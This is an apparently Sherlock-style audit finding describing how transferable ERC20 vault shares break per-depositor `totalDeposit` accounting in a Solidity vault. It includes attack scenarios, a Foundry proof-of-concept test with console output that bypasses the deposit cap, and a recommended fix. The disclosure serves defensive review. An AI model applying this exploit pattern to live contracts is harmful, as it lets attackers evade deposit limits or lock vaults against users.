Rural Blonde Cougar

medium

# Transferring ERC20 Vault tokens to another address and then withdrawing from the vault breaks `totalDeposit` accounting which is tied to deposit addresses

## Summary

Vault inherits from the ERC20, so it has transfer functions to transfer vault shares. However, `totalDeposit` accounting is tied to addresses of users who deposited with the assumption that the same user will withdraw those shares. This means that any vault tokens transfer and then withdrawal from either user breaks the accounting of `totalDeposit`, allowing to either bypass the vault's max deposit limitation, or limit the vault from new deposits, by making it revert for exceeding the vault deposit limit even if the amount deposited is very small.

## Vulnerability Detail

`Vault` inherits from `ERC20`:
```solidity
contract Vault is IVault, ERC20, EpochControls, AccessControl, Pausable {
```

which has public `transfer` and `transferFrom` functions to transfer tokens to the other users, which any user can call:
```solidity
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }
```

In order to limit the deposits to vault limit, vault has `maxDeposit` parameter set by admin. It is used to limit the deposits above this amount, reverting deposit transactions if exceeded:
```solidity
    // Avoids underflows when the maxDeposit is setted below than the totalDeposit
    if (_state.liquidity.totalDeposit > maxDeposit) {
        revert ExceedsMaxDeposit();
    }

    if (amount > maxDeposit - _state.liquidity.totalDeposit) {
        revert ExceedsMaxDeposit();
    }
```

In order to correctly calculate the current vault deposits (`_state.liquidity.totalDeposit`), the vault uses the following:
1. Vault tracks cumulative deposit for each user (`depositReceipt.cumulativeAmount`)
2. When user deposits, cumulative deposit and vault's `totalDeposit` increase by the amount of asset deposited
3. When user initiates withdrawal, both user's cumulative amount and `totalDeposit` are reduced by the percentage of cumulative amount, which is equal to perecentage of shares being withdrawn vs all shares user has.

This process is necessary, because the share price changes between deposit and withdrawal, so it tracks only actual deposits, not amounts earned or lost due to vault's profit and loss.

As can easily be seen, this withdrawal process assumes that users can't transfer their vault shares, because otherwise the withdrawal from the user who never deposited but got shares will not reduce `totalDeposit`, and user who transferred the shares away and then withdraws all remaining shares will reduce `totalDeposit` by a large amount, while the amount withdrawn is actually much smaller.

However, since `Vault` is a normal `ERC20` token, users can freely transfer vault shares to each other, breaking this assumption. This leads to 2 scenarios:
1. It's easily possible to bypass vault deposit cap:
1.1. Alice deposits up to max deposit cap (say, 1M USDC)
1.2. Alice transfers all shares except 1 wei to Bob
1.3. Alice withdraws 1 wei share. This reduces totalDeposit by full Alice deposited amount (1M USDC), but only 1 wei share is withdrawn, basically 0 assets withdrawn.
1.4. Alice deposits 1M USDC again (now the total deposited into the vault is 2M, already breaking the cap of 1M).

2. It's easily possible to lock the vault from further deposits even though the vault might have small amount (or even 0) assets deposited.
2.1. Alice deposits up to max deposit cap (say, 1M USDC)
2.2. Alice transfers all shares except 1 wei to Bob
2.3. Bob withdraws all shares. Since Bob didn't deposit previously, this doesn't reduce `totalDeposit` at all, but withdraws all 1M USDC to Bob. At this point `totalDeposit` = 1M USDC, but vault has 0 assets in it and no further deposits are accepted due to `maxDeposit` limit.

## Impact

Important security measure of vault max deposit limit can be bypassed, potentially losing funds for the users when the admin doesn't want to accept large amounts for various reasons (like testing something).

It's possible to lock vault from deposits by inflating the `totalDeposit` without vault having actual assets, rendering the operations useless due to lack of liquidity and lack of ability to deposit. Even if `maxDeposit` is increased, `totalDeposit` can be inflated again, breaking protocol core functioning.

## Proof Of Concept

Copy to `attack.t.sol`:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {UD60x18, ud, convert} from "@prb/math/UD60x18.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPositionManager} from "@project/interfaces/IPositionManager.sol";
import {Epoch} from "@project/lib/EpochController.sol";
import {AmountsMath} from "@project/lib/AmountsMath.sol";
import {EpochFrequency} from "@project/lib/EpochFrequency.sol";
import {OptionStrategy} from "@project/lib/OptionStrategy.sol";
import {AddressProvider} from "@project/AddressProvider.sol";
import {MarketOracle} from "@project/MarketOracle.sol";
import {FeeManager} from "@project/FeeManager.sol";
import {Vault} from "@project/Vault.sol";
import {TestnetToken} from "@project/testnet/TestnetToken.sol";
import {TestnetPriceOracle} from "@project/testnet/TestnetPriceOracle.sol";
import {DVPUtils} from "./utils/DVPUtils.sol";
import {TokenUtils} from "./utils/TokenUtils.sol";
import {Utils} from "./utils/Utils.sol";
import {VaultUtils} from "./utils/VaultUtils.sol";
import {MockedIG} from "./mock/MockedIG.sol";
import {MockedRegistry} from "./mock/MockedRegistry.sol";
import {MockedVault} from "./mock/MockedVault.sol";
import {TestnetSwapAdapter} from "@project/testnet/TestnetSwapAdapter.sol";
import {PositionManager} from "@project/periphery/PositionManager.sol";


contract IGVaultTest is Test {
    using AmountsMath for uint256;

    address admin = address(0x1);

    // User of Vault
    address alice = address(0x2);
    address bob = address(0x3);

    //User of DVP
    address charlie = address(0x4);
    address david = address(0x5);

    AddressProvider ap;
    TestnetToken baseToken;
    TestnetToken sideToken;
    FeeManager feeManager;

    MockedRegistry registry;

    MockedVault vault;
    MockedIG ig;
    TestnetPriceOracle priceOracle;
    TestnetSwapAdapter exchange;
    uint _strike;

    function setUp() public {
        vm.warp(EpochFrequency.REF_TS);
        //ToDo: Replace with Factory
        vm.startPrank(admin);
        ap = new AddressProvider(0);
        registry = new MockedRegistry();
        ap.grantRole(ap.ROLE_ADMIN(), admin);
        registry.grantRole(registry.ROLE_ADMIN(), admin);
        ap.setRegistry(address(registry));

        vm.stopPrank();

        vault = MockedVault(VaultUtils.createVault(EpochFrequency.DAILY, ap, admin, vm));
        priceOracle = TestnetPriceOracle(ap.priceOracle());

        baseToken = TestnetToken(vault.baseToken());
        sideToken = TestnetToken(vault.sideToken());

        vm.startPrank(admin);
       
        ig = new MockedIG(address(vault), address(ap));
        ig.grantRole(ig.ROLE_ADMIN(), admin);
        ig.grantRole(ig.ROLE_EPOCH_ROLLER(), admin);
        vault.grantRole(vault.ROLE_ADMIN(), admin);
        vm.stopPrank();
        ig.setOptionPrice(1e3);
        ig.setPayoffPerc(0.1e18); // 10 % -> position paying 1.1
        ig.useRealDeltaHedge();
        ig.useRealPercentage();
        ig.useRealPremium();

        DVPUtils.disableOracleDelayForIG(ap, ig, admin, vm);

        vm.prank(admin);
        registry.registerDVP(address(ig));
        vm.prank(admin);
        MockedVault(vault).setAllowedDVP(address(ig));
        feeManager = FeeManager(ap.feeManager());

        exchange = TestnetSwapAdapter(ap.exchangeAdapter());
    }

    function testVaultDepositLimitBypass() public {
        _strike = 1e18;
        VaultUtils.addVaultDeposit(alice, 1e18, admin, address(vault), vm);
        VaultUtils.addVaultDeposit(bob, 1e18, admin, address(vault), vm);

        Utils.skipDay(true, vm);

        vm.prank(admin);
        ig.rollEpoch();

        VaultUtils.logState(vault);
        (,,,,uint totalDeposit,,,,) = vault.vaultState();
        console.log("total deposits", totalDeposit);

        vm.startPrank(alice);
        vault.redeem(1e18);
        vault.transfer(address(charlie), 1e18-1);
        vault.initiateWithdraw(1);
        vm.stopPrank();

        VaultUtils.logState(vault);
        (,,,,totalDeposit,,,,) = vault.vaultState();
        console.log("total deposits", totalDeposit);

    }
}
```

Execution console:
```solidity
  current epoch 1698566400
  baseToken balance 1000000000000000000
  sideToken balance 1000000000000000000
  dead false
  lockedInitially 2000000000000000000
  pendingDeposits 0
  pendingWithdrawals 0
  pendingPayoffs 0
  heldShares 0
  newHeldShares 0
  base token notional 1000000000000000000
  side token notional 1000000000000000000
  ----------------------------------------
  total deposits 2000000000000000000
  current epoch 1698566400
  baseToken balance 1000000000000000000
  sideToken balance 1000000000000000000
  dead false
  lockedInitially 2000000000000000000
  pendingDeposits 0
  pendingWithdrawals 0
  pendingPayoffs 0
  heldShares 0
  newHeldShares 1
  base token notional 1000000000000000000
  side token notional 1000000000000000000
  ----------------------------------------
  total deposits 1000000000000000000
```

Notice:
1. Demonstrates vault deposit limit bypass
2. Vault has total assets of 2, but the total deposits is 1, allowing further deposits.

## Code Snippet

`Vault._initiateWithdraw` calculates amount which is subtracted from cumulative and `totalDeposit`:
https://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/Vault.sol#L487-L510

## Tool used

Manual Review

## Recommendation

Either disallow transferring of vault shares or track vault assets instead of deposits. Alternatively, re-design the withdrawal system (for example, throw out cumulative deposit calculation and simply calculate total assets and total shares and when withdrawing - reduce `totalDeposit` by the `sharesWithdrawn / totalShares * totalDeposit`)